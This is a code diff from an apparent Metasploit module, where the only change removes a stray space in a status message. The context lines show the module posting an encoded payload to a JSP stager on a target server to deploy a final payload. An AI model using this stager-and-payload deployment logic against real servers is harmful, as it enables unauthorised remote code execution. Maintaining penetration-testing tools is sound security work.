@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Auxiliary
       # call the stager to deploy our real payload war
       stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
       payload_data = "#{rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
-      print_status("#{peer} - Calling stager #{stager_uri } to deploy final payload...")
+      print_status("#{peer} - Calling stager #{stager_uri} to deploy final payload...")
       res = deploy('method' => 'POST',
                    'data'   => payload_data,
                    'uri'    => stager_uri)
